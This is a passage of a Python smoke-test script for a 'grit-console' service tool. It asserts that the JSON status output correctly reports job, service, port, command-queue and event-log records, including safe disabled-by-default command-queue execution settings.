                queue_status_json.get("summary", {}).get("workbench_job_background_supported_count") != 1 or
                queue_status_json.get("summary", {}).get("workbench_job_long_running_count") != 1 or
                workbench_jobs_state.get("path") != str(workbench_jobs_file) or
                workbench_jobs_state.get("valid") is not True or
                workbench_jobs_state.get("job_count") != 1 or
                workbench_jobs_state.get("has_jobs") is not True or
                queue_status_json.get("workbench_jobs_state_records_by_path", {}).get(str(workbench_jobs_file), {}).get("job_count") != 1 or
                queue_status_json.get("workbench_jobs_state_records_by_has_jobs", {}).get("True", [{}])[0].get("path") != str(workbench_jobs_file) or
                queue_status_json.get("summary", {}).get("workbench_jobs_state_record_count") != 1 or
                queue_status_json.get("summary", {}).get("workbench_jobs_state_has_jobs") is not True or
                job.get("effective_state") != "exited" or
                job.get("pid_alive") is not False or
                job.get("pid_managed") is not False or
                job.get("cancel_supported") is not False or
                job.get("log_exists") is not True or
                job.get("exit_status_known") is not False or
                job.get("started_at_known") is not True or
                job.get("finished_at_known") is not False or
                job.get("duration_known") is not False or
                job.get("elapsed_known") is not True or
                job.get("background_supported") is not True or
                job.get("long_running") is not True or
                job.get("last_output_tail", [])[-1:] != ["package complete"] or
                job.get("last_output_tail_count") != 20 or
                job.get("last_output_tail_truncated") is not True or
                job.get("last_output_tail_line_limit") != 20 or
                job.get("last_output_tail_byte_limit") != 8192 or
                job.get("log_line_count") != 25 or
                job.get("log_size") != workbench_job_log.stat().st_size or
                not jobs_by_action.get("package-artifact") or
                not jobs_by_state.get("exited") or
                jobs_by_pid_managed.get("False", [{}])[0].get("id") != "job-smoke" or
                jobs_by_log_exists.get("True", [{}])[0].get("id") != "job-smoke" or
                jobs_by_exit_status_known.get("False", [{}])[0].get("id") != "job-smoke" or
                jobs_by_started_at_known.get("True", [{}])[0].get("id") != "job-smoke" or
                jobs_by_finished_at_known.get("False", [{}])[0].get("id") != "job-smoke" or
                jobs_by_duration_known.get("False", [{}])[0].get("id") != "job-smoke" or
                jobs_by_elapsed_known.get("True", [{}])[0].get("id") != "job-smoke" or
                jobs_by_background_supported.get("True", [{}])[0].get("id") != "job-smoke" or
                jobs_by_long_running.get("True", [{}])[0].get("id") != "job-smoke" or
                (queue_status_json.get("workbench_jobs_by_last_output_tail_truncated") or {}).get("True", [{}])[0].get("id") != "job-smoke" or
                "workbench_jobs_state_records_by_has_jobs" not in ((queue_status_json.get("api_collections") or {}).get("workbench_jobs_state_records") or {}).get("indexes", []) or
                "workbench_jobs_by_pid_managed" not in (jobs_api.get("indexes") or []) or
                "workbench_jobs_by_log_exists" not in (jobs_api.get("indexes") or []) or
                "workbench_jobs_by_exit_status_known" not in (jobs_api.get("indexes") or []) or
                "workbench_jobs_by_started_at_known" not in (jobs_api.get("indexes") or []) or
                "workbench_jobs_by_finished_at_known" not in (jobs_api.get("indexes") or []) or
                "workbench_jobs_by_duration_known" not in (jobs_api.get("indexes") or []) or
                "workbench_jobs_by_elapsed_known" not in (jobs_api.get("indexes") or []) or
                "workbench_jobs_by_background_supported" not in (jobs_api.get("indexes") or []) or
                "workbench_jobs_by_long_running" not in (jobs_api.get("indexes") or []) or
                "workbench_jobs_by_last_output_tail_truncated" not in (jobs_api.get("indexes") or [])):
            print("server json status missing workbench background job records", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        if (service_manager_state.get("id") != "service-manager" or
                service_manager_state.get("shutdown_requested") is not False or
                service_manager_state.get("resource_count") != len(queue_status_json.get("service_manager_resources") or []) or
                service_manager_state.get("has_open_sockets") != (service_manager_state.get("open_socket_count", 0) > 0) or
                service_manager_state.get("has_active_transports") != (service_manager_state.get("active_transport_count", 0) > 0) or
                service_manager_state.get("has_alive_threads") != (service_manager_state.get("alive_thread_count", 0) > 0) or
                service_manager_state.get("has_running_children") != (service_manager_state.get("running_child_process_count", 0) > 0) or
                service_manager_state.get("has_resources") != (service_manager_state.get("resource_count", 0) > 0) or
                queue_status_json.get("service_manager_state_records_by_shutdown_requested", {}).get("False", [{}])[0].get("id") != "service-manager" or
                queue_status_json.get("service_manager_state_records_by_has_resources", {}).get(str(bool(service_manager_state.get("has_resources"))), [{}])[0].get("id") != "service-manager" or
                queue_status_json["summary"].get("service_manager_state_record_count") != 1 or
                queue_status_json["summary"].get("service_manager_has_open_sockets") != bool(service_manager_state.get("has_open_sockets")) or
                queue_status_json["summary"].get("service_manager_has_active_transports") != bool(service_manager_state.get("has_active_transports")) or
                queue_status_json["summary"].get("service_manager_has_alive_threads") != bool(service_manager_state.get("has_alive_threads")) or
                queue_status_json["summary"].get("service_manager_has_running_children") != bool(service_manager_state.get("has_running_children")) or
                queue_status_json["summary"].get("service_manager_has_resources") != bool(service_manager_state.get("has_resources")) or
                "service_manager_state_records_by_has_open_sockets" not in ((queue_status_json.get("api_collections") or {}).get("service_manager_state_records") or {}).get("indexes", [])):
            print("server json status missing reusable service-manager state record", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        if (staged_files_state.get("path") != queue_status_json.get("staged_files") or
                staged_files_state.get("exists") != staged_path_status.get("exists") or
                staged_files_state.get("has_staged") != (staged_files_state.get("staged_count", 0) > 0) or
                queue_status_json.get("staged_files_state_records_by_path", {}).get(staged_files_state.get("path"), {}).get("staged_count") != staged_files_state.get("staged_count") or
                queue_status_json.get("staged_files_state_records_by_has_staged", {}).get(str(bool(staged_files_state.get("has_staged"))), [{}])[0].get("path") != staged_files_state.get("path") or
                queue_status_json["summary"].get("staged_files_exists") != bool(staged_files_state.get("exists")) or
                queue_status_json["summary"].get("staged_files_valid") != bool(staged_files_state.get("valid")) or
                queue_status_json["summary"].get("staged_files_state_record_count") != 1 or
                queue_status_json["summary"].get("staged_files_state_has_staged") != bool(staged_files_state.get("has_staged")) or
                "staged_files_state_records_by_has_staged" not in ((queue_status_json.get("api_collections") or {}).get("staged_files_state_records") or {}).get("indexes", []) or
                not isinstance(staged_files_state.get("request_names"), list)):
            print("server json status missing reusable staged-files state record", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        if (command_queue_state.get("path") != queue_status_json.get("command_queue_file") or
                command_queue_state.get("exists") != command_queue_path_status.get("exists") or
                command_queue_state.get("valid") is not True or
                command_queue_state.get("command_count") != 1 or
                command_queue_state.get("has_commands") is not True or
                command_queue_state.get("status_counts", {}).get("result-received") != 1 or
                queue_status_json.get("command_queue_state_records_by_path", {}).get(command_queue_state.get("path"), {}).get("command_count") != 1 or
                queue_status_json.get("command_queue_state_records_by_has_commands", {}).get("True", [{}])[0].get("path") != command_queue_state.get("path") or
                queue_status_json["summary"].get("command_queue_file_exists") is not True or
                queue_status_json["summary"].get("command_queue_file_valid") is not True or
                queue_status_json["summary"].get("command_queue_file_command_count") != 1 or
                queue_status_json["summary"].get("command_queue_state_record_count") != 1 or
                queue_status_json["summary"].get("command_queue_state_has_commands") is not True or
                "command_queue_state_records_by_has_commands" not in ((queue_status_json.get("api_collections") or {}).get("command_queue_state_records") or {}).get("indexes", [])):
            print("server json status missing reusable command queue state record", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        if (server_state.get("path") != queue_status_json.get("state_file") or
                server_state.get("exists") != state_path_status.get("exists") or
                server_state.get("has_services") != (server_state.get("service_count", 0) > 0) or
                server_state.get("has_sessions") != (server_state.get("session_count", 0) > 0) or
                queue_status_json.get("server_state_records_by_path", {}).get(server_state.get("path"), {}).get("service_count") != server_state.get("service_count") or
                queue_status_json.get("server_state_records_by_has_services", {}).get(str(bool(server_state.get("has_services"))), [{}])[0].get("path") != server_state.get("path") or
                queue_status_json.get("server_state_records_by_has_sessions", {}).get(str(bool(server_state.get("has_sessions"))), [{}])[0].get("path") != server_state.get("path") or
                queue_status_json["summary"].get("server_state_exists") != bool(server_state.get("exists")) or
                queue_status_json["summary"].get("server_state_valid") != bool(server_state.get("valid")) or
                queue_status_json["summary"].get("server_state_record_count") != 1 or
                queue_status_json["summary"].get("server_state_has_services") != bool(server_state.get("has_services")) or
                queue_status_json["summary"].get("server_state_has_sessions") != bool(server_state.get("has_sessions")) or
                "server_state_records_by_has_services" not in ((queue_status_json.get("api_collections") or {}).get("server_state_records") or {}).get("indexes", []) or
                not isinstance(server_state.get("services"), dict) or
                not isinstance(server_state.get("sessions"), list)):
            print("server json status missing reusable server-state record", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        service_session_log_counts = queue_status_json["summary"].get("service_session_log_exists_counts", {})
        service_process_log_counts = queue_status_json["summary"].get("service_process_log_exists_counts", {})
        expected_service_names = {
            "ssh", "tls-shell", "plain-shell", "file-service", "command-queue",
            "bridge", "probe", "probe-tftp", "probe-ftp", "probe-dns",
        }
        expected_service_count = len(expected_service_names)
        if (queue_status_json["summary"].get("service_count") != expected_service_count or
                sum(queue_status_json["summary"].get("service_actual_counts", {}).values()) != expected_service_count or
                queue_status_json["summary"].get("service_configured_counts", {}).get("unknown", 0) < 3 or
                sum(service_session_log_counts.values()) != expected_service_count or
                sum(service_process_log_counts.values()) != expected_service_count):
            print("server json status service summary is wrong", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        services_by_name = queue_status_json.get("services_by_name") or {}
        if set(services_by_name) != expected_service_names:
            print("server json status missing stable services_by_name map", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        service_workflow_actions = queue_status_json.get("service_workflow_actions") or []
        service_actions_by_id = queue_status_json.get("service_workflow_actions_by_id") or {}
        service_actions_by_service = queue_status_json.get("service_workflow_actions_by_service") or {}
        service_actions_by_action = queue_status_json.get("service_workflow_actions_by_action_id") or {}
        service_actions_by_state = queue_status_json.get("service_workflow_actions_by_operator_action_state") or {}
        service_actions_by_reason = queue_status_json.get("service_workflow_actions_by_operator_action_reason") or {}
        service_actions_by_enter = queue_status_json.get("service_workflow_actions_by_can_run_from_curses_enter") or {}
        service_fleet_target_count = queue_status_json["summary"].get("target_count", 0)
        service_fleet_pending_work_count = queue_status_json["summary"].get("target_mailbox_pending_work_count", 0)
        expected_service_workflow_action_count = expected_service_count * 3
        if (len(service_workflow_actions) != expected_service_workflow_action_count or
                queue_status_json["summary"].get("service_workflow_action_count") != len(service_workflow_actions) or
                queue_status_json["summary"].get("service_workflow_action_available_count") != len(service_workflow_actions) or
                queue_status_json["summary"].get("service_workflow_action_requires_input_count") != 0 or
                queue_status_json["summary"].get("service_workflow_action_requires_confirmation_count") != expected_service_count or
                queue_status_json["summary"].get("service_workflow_action_can_run_from_curses_enter_count") != expected_service_count or
                queue_status_json["summary"].get("service_workflow_action_action_counts", {}).get("inspect-status") != expected_service_count or
                queue_status_json["summary"].get("service_workflow_action_action_counts", {}).get("start-service") != expected_service_count or
                queue_status_json["summary"].get("service_workflow_action_action_counts", {}).get("stop-service") != expected_service_count or
                queue_status_json["summary"].get("service_workflow_action_service_counts", {}).get("file-service") != 3 or
                sum(queue_status_json["summary"].get("service_workflow_action_operator_action_state_counts", {}).values()) != expected_service_workflow_action_count or
                sum(queue_status_json["summary"].get("service_workflow_action_operator_action_reason_counts", {}).values()) != expected_service_workflow_action_count or
                queue_status_json["summary"].get("service_workflow_action_fleet_target_count_counts", {}).get(str(service_fleet_target_count)) != len(service_workflow_actions) or
                queue_status_json["summary"].get("service_workflow_action_fleet_mailbox_pending_work_count_counts", {}).get(str(service_fleet_pending_work_count)) != len(service_workflow_actions) or
                service_actions_by_id.get("file-service:start-service", {}).get("operator_action_state") != "ready" or
                service_actions_by_id.get("file-service:start-service", {}).get("can_run_from_curses_enter") is not True or
                service_actions_by_id.get("file-service:start-service", {}).get("fleet_target_count") != service_fleet_target_count or
                service_actions_by_id.get("file-service:start-service", {}).get("fleet_mailbox_pending_work_count") != service_fleet_pending_work_count or
                "--transport file-service" not in service_actions_by_id.get("file-service:start-service", {}).get("command", "") or
                service_actions_by_id.get("file-service:start-service", {}).get("run_command") != f"scripts/grit-console --config {str(cfg)} --run-service-workflow-action file-service:start-service" or
                service_actions_by_id.get("file-service:start-service", {}).get("dry_run_command") != f"scripts/grit-console --config {str(cfg)} --run-service-workflow-action file-service:start-service --service-workflow-dry-run" or
                service_actions_by_id.get("file-service:stop-service", {}).get("operator_action_state") != "not-running" or
                service_actions_by_id.get("file-service:stop-service", {}).get("requires_confirmation") is not True or
                service_actions_by_id.get("file-service:inspect-status", {}).get("command") != f"scripts/grit-console --config {str(cfg)} --status" or
                len(service_actions_by_service.get("file-service", [])) != 3 or
                len(service_actions_by_action.get("start-service", [])) != expected_service_count or
                sum(len(items) for items in service_actions_by_state.values()) != expected_service_workflow_action_count or
                sum(len(items) for items in service_actions_by_reason.values()) != expected_service_workflow_action_count or
                len(service_actions_by_enter.get("True", [])) != expected_service_count or
                "service_workflow_actions_by_operator_action_state" not in ((queue_status_json.get("api_collections") or {}).get("service_workflow_actions") or {}).get("indexes", []) or
                "service_workflow_actions_by_fleet_mailbox_pending_work_count" not in ((queue_status_json.get("api_collections") or {}).get("service_workflow_actions") or {}).get("indexes", []) or
                "service_workflow_actions_by_can_run_from_curses_enter" not in ((queue_status_json.get("api_collections") or {}).get("service_workflow_actions") or {}).get("indexes", [])):
            print("server json status missing service workflow action descriptors", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        service_action_dry_run = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--run-service-workflow-action", "file-service:start-service",
            "--service-workflow-dry-run",
        )
        if (service_action_dry_run.returncode != 0 or
                "service workflow action: file-service:start-service" not in service_action_dry_run.stdout or
                "command=scripts/grit-console --config" not in service_action_dry_run.stdout or
                "dry_run=yes" not in service_action_dry_run.stdout or
                "--transport file-service" not in service_action_dry_run.stdout or
                "headless_command=" in service_action_dry_run.stdout):
            print("service workflow action dry-run did not expose generated start command", file=sys.stderr)
            print(service_action_dry_run.stdout, file=sys.stderr)
            print(service_action_dry_run.stderr, file=sys.stderr)
            return 1
        service_action_status = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--run-service-workflow-action", "file-service:inspect-status",
        )
        if (service_action_status.returncode != 0 or
                "service workflow action: file-service:inspect-status" not in service_action_status.stdout or
                "command=scripts/grit-console --config" not in service_action_status.stdout or
                "--status" not in service_action_status.stdout or
                "headless_command=" in service_action_status.stdout or
                "Services:" not in service_action_status.stdout):
            print("service workflow action inspect-status did not run status view", file=sys.stderr)
            print(service_action_status.stdout, file=sys.stderr)
            print(service_action_status.stderr, file=sys.stderr)
            return 1
        service_action_events = [
            json.loads(line)
            for line in Path(queue_status_json.get("event_log", "")).read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]
        if (not any(
                    event.get("event") == "service_workflow_action_dry_run" and
                    (event.get("details") or {}).get("id") == "file-service:start-service" and
                    "--service-workflow-dry-run" in ((event.get("details") or {}).get("headless_command") or "")
                    for event in service_action_events) or
                not any(
                    event.get("event") == "service_workflow_action_completed" and
                    (event.get("details") or {}).get("id") == "file-service:inspect-status" and
                    (event.get("details") or {}).get("returncode") == 0 and
                    (event.get("details") or {}).get("fleet_mailbox_pending_work_count") == service_fleet_pending_work_count
                    for event in service_action_events)):
            print("service workflow action runner did not record selected/completed events", file=sys.stderr)
            print(json.dumps(service_action_events[-12:], indent=2, sort_keys=True), file=sys.stderr)
            return 1
        services_by_actual = queue_status_json.get("services_by_actual") or {}
        services_by_configured = queue_status_json.get("services_by_configured") or {}
        services_by_port = queue_status_json.get("services_by_port") or {}
        services_by_session_log_exists = queue_status_json.get("services_by_session_log_exists") or {}
        services_by_process_log_exists = queue_status_json.get("services_by_process_log_exists") or {}
        ports = queue_status_json.get("ports") or []
        ports_by_number = queue_status_json.get("ports_by_number") or {}
        ports_by_service = queue_status_json.get("ports_by_service") or {}
        ports_by_actual = queue_status_json.get("ports_by_actual") or {}
        file_service_port = str(services_by_name.get("file-service", {}).get("port", ""))
        if (sum(len(items) for items in services_by_actual.values()) != expected_service_count or
                len(services_by_configured.get("unknown", [])) < 3 or
                not any(row.get("name") == "file-service" for row in services_by_port.get(file_service_port, [])) or
                sum(len(value) for value in services_by_session_log_exists.values()) != expected_service_count or
                sum(len(value) for value in services_by_process_log_exists.values()) != expected_service_count):
            print("server json status missing grouped service lookup maps", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        if (queue_status_json["summary"].get("port_count") != expected_service_count or
                sum(queue_status_json["summary"].get("port_actual_counts", {}).values()) != expected_service_count or
                len(ports) != expected_service_count or
                not any(row.get("service") == "file-service" for row in ports_by_number.get(file_service_port, [])) or
                ports_by_service.get("file-service", [{}])[0].get("port") != int(file_service_port) or
                sum(len(items) for items in ports_by_actual.values()) != expected_service_count):
            print("server json status missing explicit port API records", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        service_rows = {row.get("name"): row for row in queue_status_json.get("services") or []}
        for name, row in service_rows.items():
            mapped = services_by_name.get(name) or {}
            for key in ("port", "protocol", "tls", "configured", "actual", "pid", "pid_alive", "pid_managed", "listener_pids", "stale", "error", "warning_count", "warning_types"):
                if mapped.get(key) != row.get(key):
                    print(f"server json status services_by_name drift for {name}:{key}", file=sys.stderr)
                    print(queue_status_doc.stdout, file=sys.stderr)
                    return 1
        command_queue_doc = queue_status_json.get("command_queue") or {}
        command_queue_policy_record = (queue_status_json.get("command_queue_policy_records_by_id") or {}).get("command-queue") or {}
        command_queue_modes = command_queue_doc.get("mode_semantics") or {}
        command_queue_mode_records = queue_status_json.get("command_queue_mode_records") or []
        command_queue_modes_by_mode = queue_status_json.get("command_queue_modes_by_mode") or {}
        command_queue_modes_by_lifecycle = queue_status_json.get("command_queue_modes_by_lifecycle") or {}
        command_queue_modes_by_polling = queue_status_json.get("command_queue_modes_by_would_poll_if_configured") or {}
        command_queue_modes_by_live = queue_status_json.get("command_queue_modes_by_live_supported") or {}
        command_queue_modes_by_delivery = queue_status_json.get("command_queue_modes_by_delivery_supported") or {}
        command_queue_modes_by_result_upload = queue_status_json.get("command_queue_modes_by_result_upload_supported") or {}
        command_queue_modes_by_execution = queue_status_json.get("command_queue_modes_by_execution_supported") or {}
        command_queue_modes_by_control = queue_status_json.get("command_queue_modes_by_active_control_channel") or {}
        command_queue_modes_by_operator_exec = queue_status_json.get("command_queue_modes_by_operator_supplied_command_execution") or {}
        command_queue_mode_summary = command_queue_doc.get("mode_summary") or {}
        if (queue_status_json["summary"].get("command_queue_total_count") != 1 or
                queue_status_json["summary"].get("command_queue_result_count") != 1 or
                queue_status_json["summary"].get("command_queue_result_output_exceeded_count") != 0 or
                queue_status_json["summary"].get("command_queue_result_output_size_bucket_counts", {}).get("small") != 1 or
                queue_status_json["summary"].get("command_queue_status_counts", {}).get("result-received") != 1 or
                queue_status_json["summary"].get("command_queue_latest_created_at") != command_after_result.get("created_at") or
                queue_status_json["summary"].get("command_queue_latest_result_received_at") != command_after_result.get("result_received_at") or
                queue_status_json["summary"].get("command_queue_enabled") is not False or
                queue_status_json["summary"].get("command_queue_configured_for_polling") is not False or
                queue_status_json["summary"].get("command_queue_active_control_channel") is not False or
                queue_status_json["summary"].get("command_queue_token_required") is not True or
                queue_status_json["summary"].get("command_queue_token_configured") is not False or
                queue_status_json["summary"].get("command_queue_execution_mode") != "metadata-only" or
                queue_status_json["summary"].get("command_queue_metadata_only_default") is not True or
                queue_status_json["summary"].get("command_queue_execution_supported") is not False or
                queue_status_json["summary"].get("command_queue_delivery_supported") is not False or
                queue_status_json["summary"].get("command_queue_result_upload_supported") is not True or
                queue_status_json["summary"].get("command_queue_policy_record_count") != 1 or
                command_queue_policy_record.get("valid") is not True or
                command_queue_policy_record.get("enabled") is not False or
                command_queue_policy_record.get("safe_disabled_default") is not True or
                command_queue_policy_record.get("execution_mode") != "metadata-only" or
                command_queue_policy_record.get("active_control_channel") is not False or
                command_queue_policy_record.get("arbitrary_execution_allowed") is not False or
                command_queue_policy_record.get("poll_transport_supported") is not False or
                command_queue_policy_record.get("live_polling_supported") is not False or
                "requires GRIT_COMMAND_QUEUE_TLS=no" not in command_queue_policy_record.get("poll_transport_unsupported_reason", "") or
                queue_status_json.get("command_queue_policy_records_by_safe_disabled_default", {}).get("True", [{}])[0].get("id") != "command-queue" or
                queue_status_json.get("command_queue_policy_records_by_poll_transport_supported", {}).get("False", [{}])[0].get("id") != "command-queue" or
                queue_status_json.get("command_queue_policy_records_by_active_control_channel", {}).get("False", [{}])[0].get("id") != "command-queue" or
                "command_queue_policy_records_by_token_configured" not in ((queue_status_json.get("api_collections") or {}).get("command_queue_policy_records") or {}).get("indexes", []) or
                "command_queue_policy_records_by_poll_transport_supported" not in ((queue_status_json.get("api_collections") or {}).get("command_queue_policy_records") or {}).get("indexes", []) or
                queue_status_json["summary"].get("command_queue_poll_transport_supported") is not False or
                queue_status_json["summary"].get("command_queue_live_polling_supported") is not False or
                queue_status_json["summary"].get("GRIT_COMMAND_QUEUE_POLL_INTERVAL_SEC") != "5" or
                queue_status_json["summary"].get("GRIT_COMMAND_QUEUE_POLL_JITTER_PCT") != "0" or
                queue_status_json["summary"].get("GRIT_COMMAND_QUEUE_POLL_BACKOFF") != "none" or
                queue_status_json["summary"].get("GRIT_COMMAND_QUEUE_POLL_MAX_INTERVAL_SEC") != "300" or
                queue_status_json["summary"].get("GRIT_COMMAND_QUEUE_MAX_POLLS") != "0" or
                queue_status_json["summary"].get("command_queue_arbitrary_policy_requested") is not False or
                queue_status_json["summary"].get("command_queue_arbitrary_execution_allowed") is not False or
                queue_status_json["summary"].get("command_queue_safe_disabled_default") is not True or
                command_queue_modes.get("status", {}).get("lifecycle") != "inspect" or
                command_queue_modes.get("status", {}).get("would_poll_if_configured") is not False or
                command_queue_modes.get("poll", {}).get("lifecycle") != "single-poll" or
                command_queue_modes.get("once", {}).get("lifecycle") != "single-cycle" or
                command_queue_modes.get("daemon", {}).get("lifecycle") != "long-running" or
                command_queue_modes.get("stop", {}).get("lifecycle") != "stop" or
                command_queue_modes.get("stop", {}).get("requires_operator_host") is not False or
                command_queue_modes.get("stop", {}).get("would_poll_if_configured") is not False or
                command_queue_modes.get("daemon", {}).get("dry_run_default") is not True or
                command_queue_modes.get("daemon", {}).get("dry_run_only") is not True or
                command_queue_modes.get("daemon", {}).get("live_supported") is not False or
                command_queue_modes.get("daemon", {}).get("live_transport_supported") is not False or
                "requires GRIT_COMMAND_QUEUE_TLS=no" not in command_queue_modes.get("daemon", {}).get("live_transport_unsupported_reason", "") or
                command_queue_modes.get("daemon", {}).get("live_would_contact_operator") is not False or
                command_queue_modes.get("daemon", {}).get("execution_supported") is not False or
                command_queue_modes.get("daemon", {}).get("active_control_channel") is not False or
                len(command_queue_mode_records) != 5 or
                command_queue_modes_by_mode.get("daemon", {}).get("lifecycle") != "long-running" or
                len(command_queue_modes_by_lifecycle.get("long-running", [])) != 1 or
                len(command_queue_modes_by_polling.get("True", [])) != 3 or
                len(command_queue_modes_by_polling.get("False", [])) != 2 or
                len(command_queue_modes_by_live.get("True", [])) != 0 or
                len((queue_status_json.get("command_queue_modes_by_live_transport_supported") or {}).get("False", [])) != 5 or
                len(command_queue_modes_by_delivery.get("False", [])) != 5 or
                len(command_queue_modes_by_result_upload.get("True", [])) != 5 or
                len(command_queue_modes_by_execution.get("False", [])) != 5 or
                len(command_queue_modes_by_control.get("False", [])) != 5 or
                len(command_queue_modes_by_operator_exec.get("False", [])) != 5 or
                command_queue_mode_summary.get("mode_count") != 5 or
                command_queue_mode_summary.get("polling_mode_count") != 3 or
                command_queue_mode_summary.get("operator_host_required_mode_count") != 3 or
                command_queue_mode_summary.get("live_supported_mode_count") != 0 or
                command_queue_mode_summary.get("delivery_supported_mode_count") != 0 or
                command_queue_mode_summary.get("result_upload_supported_mode_count") != 5 or
                command_queue_mode_summary.get("execution_supported_mode_count") != 0 or
                queue_status_json["summary"].get("command_queue_mode_count") != 5 or
                queue_status_json["summary"].get("command_queue_polling_mode_count") != 3 or
                queue_status_json["summary"].get("command_queue_operator_host_required_mode_count") != 3 or
                queue_status_json["summary"].get("command_queue_live_supported_mode_count") != 0 or
                queue_status_json["summary"].get("command_queue_delivery_supported_mode_count") != 0 or
                queue_status_json["summary"].get("command_queue_result_upload_supported_mode_count") != 5 or
                queue_status_json["summary"].get("command_queue_execution_supported_mode_count") != 0 or
                queue_status_json["summary"].get("command_queue_active_control_channel_mode_count") != 0 or
                queue_status_json["summary"].get("command_queue_operator_supplied_command_execution_mode_count") != 0):
            print("server json status missing aggregate command queue counts", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        event_stats = queue_status_json.get("event_log_stats") or {}
        event_log_state = queue_status_json.get("event_log_state") or {}
        event_tail_omitted_count = max(0, event_stats.get("total_count", 0) - event_stats.get("tail_count", 0))
        event_tail_truncated = event_tail_omitted_count > 0
        if (event_stats.get("total_count", 0) < 2 or
                event_stats.get("tail_count") != len(queue_status_json.get("events", [])) or
                queue_status_json["summary"].get("event_count") != event_stats.get("total_count") or
                queue_status_json["summary"].get("event_tail_count") != event_stats.get("tail_count") or
                event_stats.get("tail_truncated") is not event_tail_truncated or
                event_stats.get("tail_omitted_count") != event_tail_omitted_count or
                queue_status_json["summary"].get("event_tail_truncated") is not event_tail_truncated or
                queue_status_json["summary"].get("event_tail_omitted_count") != event_tail_omitted_count or
                not event_stats.get("first_event_at") or
                not event_stats.get("latest_event_at") or
                queue_status_json["summary"].get("first_event_at") != event_stats.get("first_event_at") or
                queue_status_json["summary"].get("latest_event_at") != event_stats.get("latest_event_at")):
            print("server json status missing event log total/tail stats", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        if (event_log_state.get("path") != queue_status_json.get("event_log") or
                event_log_state.get("exists") is not True or
                event_log_state.get("valid") is not True or
                event_log_state.get("event_count") != event_stats.get("total_count") or
                event_log_state.get("invalid_count") != event_stats.get("invalid_count") or
                event_log_state.get("tail_truncated") is not event_tail_truncated or
                event_log_state.get("tail_omitted_count") != event_tail_omitted_count or
                event_log_state.get("has_invalid_records") is not False or
                queue_status_json.get("event_log_state_records_by_path", {}).get(event_log_state.get("path"), {}).get("event_count") != event_stats.get("total_count") or
                queue_status_json.get("event_log_state_records_by_valid", {}).get("True", [{}])[0].get("path") != event_log_state.get("path") or
                "event_log_state_records_by_has_invalid_records" not in ((queue_status_json.get("api_collections") or {}).get("event_log_state_records") or {}).get("indexes", []) or
                queue_status_json["summary"].get("event_log_state_record_count") != 1 or
                queue_status_json["summary"].get("event_log_exists") is not True or
                queue_status_json["summary"].get("event_log_valid") is not True or
                queue_status_json["summary"].get("event_log_size", 0) <= 0):
            print("server json status missing reusable event log state record", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        if (event_stats.get("by_service", {}).get("command-queue", 0) < 2 or
                event_stats.get("by_event", {}).get("command_queue_queued", 0) < 1 or
                event_stats.get("by_event", {}).get("command_result_received", 0) < 1 or
                event_stats.get("by_level", {}).get("info", 0) < 2 or
                event_stats.get("by_service_event", {}).get("command-queue:command_queue_queued", 0) < 1 or
                event_stats.get("by_service_event", {}).get("command-queue:command_result_received", 0) < 1 or
                event_stats.get("by_detail_command_id", {}).get(command_id, 0) < 2 or
                event_stats.get("by_detail_command_sha256", {}).get(expected_command_sha, 0) < 2 or
                event_stats.get("by_event_detail_command_id", {}).get(f"command_result_received:{command_id}", 0) < 1 or
                event_stats.get("by_event_detail_command_sha256", {}).get(f"command_result_received:{expected_command_sha}", 0) < 1 or
                event_stats.get("by_service_detail_command_id", {}).get(f"command-queue:{command_id}", 0) < 2 or
                event_stats.get("by_service_detail_command_sha256", {}).get(f"command-queue:{expected_command_sha}", 0) < 2):
            print("server json status missing event log aggregate counters", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        event_summary = queue_status_json.get("summary", {})
        if (event_summary.get("event_service_counts", {}).get("command-queue", 0) < 2 or
                event_summary.get("event_type_counts", {}).get("command_queue_queued", 0) < 1 or
                event_summary.get("event_type_counts", {}).get("command_result_received", 0) < 1 or
                event_summary.get("event_level_counts", {}).get("info", 0) < 2 or
                event_summary.get("event_service_event_counts", {}).get("command-queue:command_queue_queued", 0) < 1 or
                event_summary.get("event_service_event_counts", {}).get("command-queue:command_result_received", 0) < 1 or
                event_summary.get("event_service_level_counts", {}).get("command-queue:info", 0) < 2 or
                event_summary.get("event_type_level_counts", {}).get("command_queue_queued:info", 0) < 1 or
                event_summary.get("event_detail_command_id_counts", {}).get(command_id, 0) < 2 or
                event_summary.get("event_detail_command_sha256_counts", {}).get(expected_command_sha, 0) < 2 or
                event_summary.get("event_type_detail_command_id_counts", {}).get(f"command_result_received:{command_id}", 0) < 1 or
                event_summary.get("event_type_detail_command_sha256_counts", {}).get(f"command_result_received:{expected_command_sha}", 0) < 1 or
                event_summary.get("event_service_detail_command_id_counts", {}).get(f"command-queue:{command_id}", 0) < 2 or
                event_summary.get("event_service_detail_command_sha256_counts", {}).get(f"command-queue:{expected_command_sha}", 0) < 2):
            print("server json status missing mirrored event aggregate summary counters", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        events_by_service = queue_status_json.get("events_by_service") or {}
        events_by_id = queue_status_json.get("events_by_id") or {}
        events_by_event = queue_status_json.get("events_by_event") or {}
        events_by_level = queue_status_json.get("events_by_level") or {}
        events_by_service_event = queue_status_json.get("events_by_service_event") or {}
        events_by_service_level = queue_status_json.get("events_by_service_level") or {}
        events_by_event_level = queue_status_json.get("events_by_event_level") or {}
        events_by_remote_event = queue_status_json.get("events_by_remote_event") or {}
        events_by_remote_level = queue_status_json.get("events_by_remote_level") or {}
